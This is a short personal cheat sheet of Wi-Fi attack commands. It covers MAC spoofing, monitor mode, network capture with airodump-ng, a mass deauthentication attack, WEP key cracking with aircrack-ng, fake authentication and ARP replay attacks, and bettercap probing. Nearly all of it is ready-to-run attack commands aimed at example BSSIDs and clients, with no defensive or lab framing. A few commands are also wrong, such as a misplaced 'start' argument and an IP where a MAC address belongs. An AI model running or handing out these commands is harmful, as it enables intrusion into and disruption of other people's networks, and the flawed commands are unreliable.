HOW TO CHANGE MAC ADDRESS

ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up

------------------------------------------------------------------

iwconfig - this cmd will show only wireless interfaces
airmon-ng check kill - this cmd will kills alll processes that may interfere in our work during attacks.


iwconfig wlan0 mode monitor (this cmd will change the wlan manager mode to monitor mode)

airodump-ng wlan0 start (this will list all the wireless networks around you)

airodump-ng --band a wlan0 (this will list all the wireless networks around you which has 5ghz frequency .i.e)5G  )

airodump-ng --bssid 1C:5F:2B:9F:87:A4 --channel 10 --write test wlan0  (this will capture the particular network with the bssid and channel , then I write it to a file(output)  )
#you can open the save file in wireshark.

aireplay-ng --deauth 10000000 -a 1C:5F:2B:9F:87:A4 -c FE:44:9E:8C:7F:54 wlan0 


How to crack WEP

airodump-ng --bssid 1C:5F:2B:9F:87:A4 --channel 10 --write test wlan0    

aircrack-ng test01.cap

#first you have to capture the data packets from the particular network and save it in a file using airodump.
#next put the file in aircrack 
#it will give you a key like this - [41:73:32:54:12] .
#just remove colons (4173325412).
#4173325412 - this is the password of the wifi.

ATTACKS : 

aireplay-ng --deauth 10000000 -a 1C:5F:2B:9F:87:A4 -c FE:44:9E:8C:7F:54 wlan0   (de-authentication attack)

aireplay-ng --fakeauth 0 -a 1C:5F:2B:9F:87:A4 -h #yourwlanip wlan0   (fake authentication attack)

aireplay-ng --arpreplay -b 1C:5F:2B:9F:87:A4 -h #yourwlanip wlan0 (arp request relay attack) 


BETTERCAP :

net.probe - this cmd will show all connected devices in our network

net.show - this cmd will show all the ip addresses received by our device in a table
